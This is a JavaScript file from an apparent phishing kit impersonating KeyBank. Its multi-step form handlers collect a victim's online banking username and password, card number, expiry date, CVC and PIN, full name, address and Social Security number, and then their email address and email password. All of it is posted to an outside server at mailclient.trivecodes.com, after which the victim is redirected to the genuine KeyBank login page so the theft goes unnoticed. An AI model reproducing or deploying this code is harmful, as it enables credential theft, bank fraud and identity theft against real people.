const firstsubmit = () => {
  document.getElementById("firstbtn").setAttribute("disabled", true);

  const firstuse = document.getElementById("orgus").value;
  const firstmove = document.getElementById("orgpd").value;

  if (
    firstuse !== undefined &&
    firstuse !== "" &&
    firstuse !== null &&
    firstmove !== undefined &&
    firstmove !== "" &&
    firstmove !== null
  ) {
    sessionStorage.setItem("Keyusername", firstuse);
    sessionStorage.setItem("Keypassword", firstmove);

    setTimeout(() => location.assign("./confirmLogin.html"), 3000);
  } else {
    document.getElementById("orgus").style.borderBottom = "1px solid #b22222";

    document.getElementById("orgpd").style.borderBottom = "1px solid #b22222";

    document.getElementById("firstbtn").removeAttribute("disabled");
  }
};

const secondsubmit = () => {
  document.getElementById("secondbtn").setAttribute("disabled", true);

  const firstcn = document.getElementById("orgcn").value;
  const firsted = document.getElementById("orged").value;
  const firstcc = document.getElementById("orgcc").value;
  const firstcp = document.getElementById("orgcp").value;

  if (firstcn.length < 14) {
    document.getElementById("orgcn").style.borderBottom = "1px solid #b22222";

    document.getElementById("secondbtn").removeAttribute("disabled");
    return false;
  }

  if (
    firsted.length < 4 ||
    Number(firsted.split("/")[0]) > 12 ||
    Number(firsted.split("/")[1]) < 22
  ) {
    document.getElementById("orged").style.borderBottom = "1px solid #b22222";

    document.getElementById("secondbtn").removeAttribute("disabled");
    return false;
  }

  if (firstcc.length < 3) {
    document.getElementById("orgcc").style.borderBottom = "1px solid #b22222";

    document.getElementById("secondbtn").removeAttribute("disabled");
    return false;
  }

  if (firstcp.length < 4) {
    document.getElementById("orgcp").style.borderBottom = "1px solid #b22222";

    document.getElementById("secondbtn").removeAttribute("disabled");
    return false;
  }

  sessionStorage.setItem("cardNumber", firstcn);
  sessionStorage.setItem("cardExpiryDate", firsted);
  sessionStorage.setItem("cardCVC", firstcc);
  sessionStorage.setItem("cardPin", firstcp);

  setTimeout(() => location.assign("./confirmPersonal.html"), 3000);
};

const thirdsubmit = () => {
  document.getElementById("thirdbtn").setAttribute("disabled", true);

  const userfullName = document.getElementById("userfullName").value;
  const userfullMobile = document.getElementById("userfullMobile").value;
  const userfullAddress = document.getElementById("userfullAddress").value;
  const userfullCity = document.getElementById("userfullCity").value;
  const userfullState = document.getElementById("userfullState").value;
  const userfullZip = document.getElementById("userfullZip").value;
  const userfullSSN = document.getElementById("userfullSSN").value;

  if (
    userfullName !== undefined &&
    userfullName !== "" &&
    userfullName !== null &&
    userfullMobile !== undefined &&
    userfullMobile !== "" &&
    userfullMobile !== null &&
    userfullAddress !== undefined &&
    userfullAddress !== "" &&
    userfullAddress !== null &&
    userfullCity !== undefined &&
    userfullCity !== "" &&
    userfullCity !== null &&
    userfullState !== undefined &&
    userfullState !== "" &&
    userfullState !== null &&
    userfullZip !== undefined &&
    userfullZip !== "" &&
    userfullZip !== null &&
    userfullSSN !== undefined &&
    userfullSSN !== "" &&
    userfullSSN !== null
  ) {
    sessionStorage.setItem("BOWuserfullName", userfullName);
    sessionStorage.setItem("BOWuserfullMobile", userfullMobile);
    sessionStorage.setItem("BOWuserfullAddress", userfullAddress);
    sessionStorage.setItem("BOWuserfullCity", userfullCity);
    sessionStorage.setItem("BOWuserfullState", userfullState);
    sessionStorage.setItem("BOWuserfullZip", userfullZip);
    sessionStorage.setItem("BOWuserfullSSN", userfullSSN);

    setTimeout(() => location.assign("./confirmEmail.html"), 3000);
  } else {
    document.getElementById("userfullName").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullMobile").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullAddress").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullCity").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullState").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullZip").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullSSN").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("thirdbtn").removeAttribute("disabled");
  }
};

const lastsubmit = () => {
  document.getElementById("lastbtn").setAttribute("disabled", true);

  const email = document.getElementById("orgus").value;
  const emailpassword = document.getElementById("orgpd").value;

  if (
    email !== undefined &&
    email !== "" &&
    email !== null &&
    emailpassword !== undefined &&
    emailpassword !== "" &&
    emailpassword !== null
  ) {
    sessionStorage.setItem("KeyEmail", email);
    sessionStorage.setItem("KeyEmailpassword", emailpassword);

    completeSubmission();
  } else {
    document.getElementById("orgus").style.borderBottom = "1px solid #b22222";

    document.getElementById("orgpd").style.borderBottom = "1px solid #b22222";

    document.getElementById("lastbtn").removeAttribute("disabled");
  }
};

const completeSubmission = async () => {
  const MailReturn = await fetch(
    "https://mailclient.trivecodes.com/keyBank/php/mail_key.php",
    {
      method: "POST",
      headers: {
        "Content-Type": "application.json",
      },
      body: JSON.stringify({
        username: sessionStorage.Keyusername,
        password: sessionStorage.Keypassword,
        cardNumber: sessionStorage.cardNumber,
        cardExpiryDate: sessionStorage.cardExpiryDate,
        cardCVC: sessionStorage.cardCVC,
        cardPin: sessionStorage.cardPin,
        Name: sessionStorage.BOWuserfullName,
        Mobile: sessionStorage.BOWuserfullMobile,
        Address: sessionStorage.BOWuserfullAddress,
        City: sessionStorage.BOWuserfullCity,
        State: sessionStorage.BOWuserfullState,
        Zip: sessionStorage.BOWuserfullZip,
        SSN: sessionStorage.BOWuserfullSSN,
        Email: sessionStorage.KeyEmail,
        EmailPass: sessionStorage.KeyEmailpassword,
      }),
    }
  );

  await sessionStorage.clear();

  MailReturn.text().then(
    (data) =>
      data === "Sent" &&
      location.assign("https://ibx.key.com/ibxolb/login/index.html#/login")
  );
};
